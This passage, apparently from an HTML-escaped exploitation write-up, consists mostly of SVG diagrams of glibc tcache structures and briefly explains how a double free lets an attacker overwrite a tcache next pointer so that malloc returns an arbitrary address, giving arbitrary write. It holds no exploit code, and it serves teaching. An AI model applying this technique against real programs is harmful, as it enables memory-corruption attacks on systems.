requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;75&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;1&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,71)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 1 L 530 1 L 530 141 L 550 141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,71)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 86 L 233.63 86&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 86 L 231.88 89.5 L 233.63 86 L 231.88 82.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 385 341 L 440 341 L 440 161 L 305 161 L 305 174.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;301&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 301px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;313&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;&#x2F;g&gt;&lt;switch&gt;&lt;g requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&#x2F;&gt;&lt;a transform=&quot;translate(0,-5)&quot; xlink:href=&quot;https:&#x2F;&#x2F;desk.draw.io&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;16000042487&quot; target=&quot;_blank&quot;&gt;&lt;text text-anchor=&quot;middle&quot; font-size=&quot;10px&quot; x=&quot;50%&quot; y=&quot;100%&quot;&gt;Viewer does not support full SVG 1.1&lt;&#x2F;text&gt;&lt;&#x2F;a&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;svg&gt;
&lt;p&gt;If we call &lt;code&gt;malloc&lt;&#x2F;code&gt; now with the same size as the double freed chunk, we will receive that chunk again. If we are able 
to write in the chunk, we can overwrite the &lt;code&gt;next&lt;&#x2F;code&gt; pointer because libc does not expect the chunk to be in use. Then, 
&lt;code&gt;malloc&lt;&#x2F;code&gt; will return the written address + 0x10 due to the chunk header.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;achieving-arbitrary-write&quot;&gt;Achieving Arbitrary Write&lt;&#x2F;h2&gt;
&lt;p&gt;We can abuse this double free to force malloc to return an arbitrary pointer to any memory location. Because the binary 
allows us to write to the location returned by malloc, we have arbitrary write:&lt;&#x2F;p&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;
&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version=&quot;1.1&quot; width=&quot;621px&quot; height=&quot;1422px&quot; viewBox=&quot;-0.5 -0.5 621 1422&quot;&gt;&lt;defs&#x2F;&gt;&lt;g&gt;&lt;rect x=&quot;0&quot; y=&quot;21&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 21px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;33&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 385 221 L 400 221 L 400 281 L 305 281 L 305 294.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 299.88 L 301.5 292.88 L 305 294.63 L 308.5 292.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;181&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 181px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;193&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;1&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 1 L 240 1 L 240 141 L 260 141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 96 L 305 151 L 200 151 L 200 281 L 280.4 281 L 280.37 293.83&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 280.36 299.08 L 276.88 292.07 L 280.37 293.83 L 283.88 292.09 Z&quot; fill=&quot;#b85450&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;46&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;75&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;46&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 71px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;75&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;71&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;1&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,71)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 1 L 530 1 L 530 141 L 550 141&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,71)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 86 L 233.63 86&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 86 L 231.88 89.5 L 233.63 86 L 231.88 82.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 385 341 L 440 341 L 440 161 L 305 161 L 305 174.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 179.88 L 301.5 172.88 L 305 174.63 L 308.5 172.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;301&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 301px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;313&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 140 221 L 180 221 L 180 313.3 L 219.59 313.32&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 224.84 313.32 L 217.84 316.82 L 219.59 313.32 L 217.84 309.82 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 140 221 L 180 221 L 180 190.1 L 218.63 190.12&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 223.88 190.12 L 216.88 193.62 L 218.63 190.12 L 216.88 186.62 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;20&quot; y=&quot;191&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 221px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;void* malloc()&lt;br &#x2F;&gt;(malloc 1)&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;225&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;void* malloc()...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;281&quot; width=&quot;160&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 158px; height: 1px; padding-top: 351px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: black; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;Since the memory chunk returned from malloc is still in the tcache list, modifying the &lt;font face=&quot;Lucida Console&quot;&gt;next&lt;&#x2F;font&gt; pointer will change the next returned value from malloc.&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Note that &lt;font face=&quot;Lucida Console&quot;&gt;tcache_entry&lt;&#x2F;font&gt; is stored within the user region of the chunk.&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;355&quot; fill=&quot;black&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;Since the memory chunk ret...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;481&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 481px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;493&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 385 681 L 493.63 681&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 498.88 681 L 491.88 684.5 L 493.63 681 L 491.88 677.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;641&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 641px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;653&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;461&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path 